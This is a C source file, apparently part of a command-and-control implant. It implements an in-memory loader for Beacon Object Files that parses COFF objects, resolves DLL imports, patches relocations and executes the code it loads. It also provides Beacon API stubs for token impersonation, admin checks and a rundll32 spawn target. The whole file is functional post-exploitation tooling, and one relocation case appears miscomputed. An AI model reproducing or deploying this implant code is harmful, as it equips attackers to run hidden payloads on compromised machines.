#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include "../../include/bof_loader.h"
#include "../../include/config.h"

// Global output buffer for current BOF execution
static BYTE  *g_bof_output = NULL;
static DWORD  g_bof_output_size = 0;
static DWORD  g_bof_output_capacity = 0;

static void bof_output_init(void) {
    g_bof_output_capacity = BEACON_OUTPUT_SIZE;
    g_bof_output = (BYTE *)VirtualAlloc(NULL, g_bof_output_capacity, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_bof_output_size = 0;
}

static void bof_output_append(const char *data, DWORD len) {
    if (!g_bof_output) return;
    if (g_bof_output_size + len > g_bof_output_capacity) return;
    CopyMemory(g_bof_output + g_bof_output_size, data, len);
    g_bof_output_size += len;
}

// --- Beacon API Implementation ---

void BeaconPrintf(int type, char *fmt, ...) {
    char buf[8192];
    va_list args;
    va_start(args, fmt);
    int len = _vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) {
        bof_output_append(buf, (DWORD)len);
        bof_output_append("\n", 1);
    }
}

void BeaconOutput(int type, char *data, int len) {
    if (data && len > 0) {
        bof_output_append(data, (DWORD)len);
    }
}

void BeaconDataParse(datap *parser, char *buffer, int size) {
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size;
    parser->size = size;
}

char *BeaconDataPtr(datap *parser, int size) {
    if (parser->length < size) return NULL;
    char *ptr = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return ptr;
}

int BeaconDataInt(datap *parser) {
    if (parser->length < 4) return 0;
    int val = *(int *)parser->buffer;
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap *parser) {
    if (parser->length < 2) return 0;
    short val = *(short *)parser->buffer;
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

int BeaconDataLength(datap *parser) {
    return parser->length;
}

char *BeaconDataExtract(datap *parser, int *size) {
    int len = BeaconDataInt(parser);
    if (size) *size = len;
    return BeaconDataPtr(parser, len);
}

void BeaconFormatAlloc(formatp *format, int maxsz) {
    format->original = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxsz);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}

void BeaconFormatReset(formatp *format) {
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatFree(formatp *format) {
    if (format->original) {
        HeapFree(GetProcessHeap(), 0, format->original);
        format->original = NULL;
    }
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
}

void BeaconFormatAppend(formatp *format, char *text, int len) {
    if (format->length + len > format->size) return;
    CopyMemory(format->buffer + format->length, text, len);
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, char *fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    int len = _vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) BeaconFormatAppend(format, buf, len);
}

char *BeaconFormatToString(formatp *format, int *size) {
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp *format, int value) {
    int swapped = _byteswap_ulong(value);  // Network byte order
    BeaconFormatAppend(format, (char *)&swapped, 4);
}

BOOL BeaconUseToken(HANDLE token) {
    return ImpersonateLoggedOnUser(token);
}

void BeaconRevertToken(void) {
    RevertToSelf();
}

BOOL BeaconIsAdmin(void) {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &size)) {
            isAdmin = elev.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isAdmin;
}

void BeaconGetSpawnTo(BOOL x86, char *buffer, int length) {
    if (x86)
        lstrcpynA(buffer, "C:\\Windows\\SysWOW64\\rundll32.exe", length);
    else
        lstrcpynA(buffer, "C:\\Windows\\System32\\rundll32.exe", length);
}

BOOL toWideChar(char *src, wchar_t *dst, int max) {
    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max) > 0;
}

// --- Internal function resolution table for BOF imports ---

typedef struct {
    const char *module;
    const char *function;
    PVOID       address;
} BOF_IMPORT;

// Resolve DLL!Function imports that BOFs reference
static PVOID resolve_bof_import(const char *symbol_name) {
    // BOF imports follow pattern: __imp_MODULE$FUNCTION or __imp_BEACONAPI
    // e.g., __imp_KERNEL32$CreateFileA, __imp_BeaconPrintf

    // Check Beacon API functions first
    if (lstrcmpA(symbol_name, "__imp_BeaconPrintf") == 0) return (PVOID)BeaconPrintf;
    if (lstrcmpA(symbol_name, "__imp_BeaconOutput") == 0) return (PVOID)BeaconOutput;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataParse") == 0) return (PVOID)BeaconDataParse;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataPtr") == 0) return (PVOID)BeaconDataPtr;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataInt") == 0) return (PVOID)BeaconDataInt;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataShort") == 0) return (PVOID)BeaconDataShort;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataLength") == 0) return (PVOID)BeaconDataLength;
    if (lstrcmpA(symbol_name, "__imp_BeaconDataExtract") == 0) return (PVOID)BeaconDataExtract;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatAlloc") == 0) return (PVOID)BeaconFormatAlloc;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatReset") == 0) return (PVOID)BeaconFormatReset;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatFree") == 0) return (PVOID)BeaconFormatFree;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatAppend") == 0) return (PVOID)BeaconFormatAppend;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatPrintf") == 0) return (PVOID)BeaconFormatPrintf;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatToString") == 0) return (PVOID)BeaconFormatToString;
    if (lstrcmpA(symbol_name, "__imp_BeaconFormatInt") == 0) return (PVOID)BeaconFormatInt;
    if (lstrcmpA(symbol_name, "__imp_BeaconUseToken") == 0) return (PVOID)BeaconUseToken;
    if (lstrcmpA(symbol_name, "__imp_BeaconRevertToken") == 0) return (PVOID)BeaconRevertToken;
    if (lstrcmpA(symbol_name, "__imp_BeaconIsAdmin") == 0) return (PVOID)BeaconIsAdmin;
    if (lstrcmpA(symbol_name, "__imp_BeaconGetSpawnTo") == 0) return (PVOID)BeaconGetSpawnTo;
    if (lstrcmpA(symbol_name, "__imp_toWideChar") == 0) return (PVOID)toWideChar;

    // DLL imports: __imp_MODULE$Function
    const char *prefix = "__imp_";
    if (strncmp(symbol_name, prefix, 6) != 0) return NULL;

    const char *import_name = symbol_name + 6;
    char *dollar = strchr(import_name, '$');
    if (!dollar) return NULL;

    // Extract module and function names
    char module_name[128] = {0};
    char func_name[256] = {0};
    int mod_len = (int)(dollar - import_name);
    CopyMemory(module_name, import_name, min(mod_len, 127));
    lstrcpynA(func_name, dollar + 1, 255);

    // Load the module and resolve
    char dll_name[128];
    _snprintf(dll_name, sizeof(dll_name), "%s.dll", module_name);

    HMODULE hMod = GetModuleHandleA(dll_name);
    if (!hMod) hMod = LoadLibraryA(dll_name);
    if (!hMod) return NULL;

    return (PVOID)GetProcAddress(hMod, func_name);
}

// Get symbol name from COFF string table
static const char *get_symbol_name(COFF_SYMBOL *sym, char *string_table) {
    if (sym->Name.LongName.Zeros == 0) {
        return string_table + sym->Name.LongName.Offset;
    }
    return sym->Name.ShortName;
}

// --- Main BOF Loader ---

BOOL bof_load_and_execute(BYTE *coff_data, DWORD coff_size, BYTE *args, DWORD args_size, BOF_RESULT *result) {
    if (!coff_data || coff_size < sizeof(COFF_FILE_HEADER)) return FALSE;
    if (coff_size > MAX_BOF_SIZE) return FALSE;

    bof_output_init();

    COFF_FILE_HEADER *header = (COFF_FILE_HEADER *)coff_data;
    COFF_SECTION *sections = (COFF_SECTION *)(coff_data + sizeof(COFF_FILE_HEADER));
    COFF_SYMBOL *symbols = (COFF_SYMBOL *)(coff_data + header->PointerToSymbolTable);
    char *string_table = (char *)(symbols + header->NumberOfSymbols);

    // Allocate memory for each section
    PVOID *section_bases = (PVOID *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                              header->NumberOfSections * sizeof(PVOID));
    if (!section_bases) return FALSE;

    for (WORD i = 0; i < header->NumberOfSections; i++) {
        DWORD alloc_size = max(sections[i].SizeOfRawData, sections[i].VirtualSize);
        if (alloc_size == 0) alloc_size = 64;

        section_bases[i] = VirtualAlloc(NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!section_bases[i]) goto cleanup;

        if (sections[i].SizeOfRawData > 0) {
            CopyMemory(section_bases[i], coff_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }

    // Process relocations
    for (WORD i = 0; i < header->NumberOfSections; i++) {
        if (sections[i].NumberOfRelocations == 0) continue;

        COFF_RELOCATION *relocs = (COFF_RELOCATION *)(coff_data + sections[i].PointerToRelocations);

        for (WORD r = 0; r < sections[i].NumberOfRelocations; r++) {
            COFF_SYMBOL *sym = &symbols[relocs[r].SymbolTableIndex];
            PVOID target_addr = NULL;

            if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym->SectionNumber == 0) {
                // External symbol - resolve import
                const char *sym_name = get_symbol_name(sym, string_table);
                target_addr = resolve_bof_import(sym_name);
                if (!target_addr) goto cleanup;
            } else if (sym->SectionNumber > 0) {
                // Internal symbol - relative to section
                WORD sec_idx = sym->SectionNumber - 1;
                target_addr = (PVOID)((BYTE *)section_bases[sec_idx] + sym->Value);
            }

            if (!target_addr) continue;

            BYTE *reloc_site = (BYTE *)section_bases[i] + relocs[r].VirtualAddress;

            switch (relocs[r].Type) {
            case IMAGE_REL_AMD64_ADDR64:
                *(UINT64 *)reloc_site = (UINT64)target_addr;
                break;
            case IMAGE_REL_AMD64_ADDR32NB:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 4));
                break;
            case IMAGE_REL_AMD64_REL32:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 4));
                break;
            case IMAGE_REL_AMD64_REL32_1:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 5));
                break;
            case IMAGE_REL_AMD64_REL32_2:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 6));
                break;
            case IMAGE_REL_AMD64_REL32_3:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 7));
                break;
            case IMAGE_REL_AMD64_REL32_4:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 8));
                break;
            case IMAGE_REL_AMD64_REL32_5:
                *(DWORD *)reloc_site = (DWORD)((BYTE *)target_addr - (reloc_site + 9));
                break;
            }
        }
    }

    // Find entry point (go or _go symbol)
    PVOID entry_point = NULL;
    for (DWORD i = 0; i < header->NumberOfSymbols; i++) {
        const char *name = get_symbol_name(&symbols[i], string_table);
        if ((lstrcmpA(name, "go") == 0 || lstrcmpA(name, "_go") == 0) &&
            symbols[i].SectionNumber > 0) {
            WORD sec_idx = symbols[i].SectionNumber - 1;
            entry_point = (PVOID)((BYTE *)section_bases[sec_idx] + symbols[i].Value);
            break;
        }
        i += symbols[i].NumberOfAuxSymbols;
    }

    if (!entry_point) goto cleanup;

    for (WORD i = 0; i < header->NumberOfSections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD alloc_size = max(sections[i].SizeOfRawData, sections[i].VirtualSize);
            if (alloc_size == 0) alloc_size = 64;
            DWORD old;
            VirtualProtect(section_bases[i], alloc_size, PAGE_EXECUTE_READ, &old);
        }
    }

    // Execute BOF entry point: void go(char *args, int alen)
    typedef void (*bof_entry)(char *, int);
    ((bof_entry)entry_point)((char *)args, (int)args_size);

    // Collect output
    if (result) {
        result->output = g_bof_output;
        result->output_size = g_bof_output_size;
        result->exit_code = 0;
        g_bof_output = NULL; // Transfer ownership
    }

    // Cleanup section memory
    for (WORD i = 0; i < header->NumberOfSections; i++) {
        if (section_bases[i]) VirtualFree(section_bases[i], 0, MEM_RELEASE);
    }
    HeapFree(GetProcessHeap(), 0, section_bases);
    return TRUE;

cleanup:
    for (WORD i = 0; i < header->NumberOfSections; i++) {
        if (section_bases[i]) VirtualFree(section_bases[i], 0, MEM_RELEASE);
    }
    HeapFree(GetProcessHeap(), 0, section_bases);
    if (g_bof_output) VirtualFree(g_bof_output, 0, MEM_RELEASE);
    g_bof_output = NULL;
    return FALSE;
}

void bof_result_free(BOF_RESULT *result) {
    if (result && result->output) {
        VirtualFree(result->output, 0, MEM_RELEASE);
        result->output = NULL;
    }
}
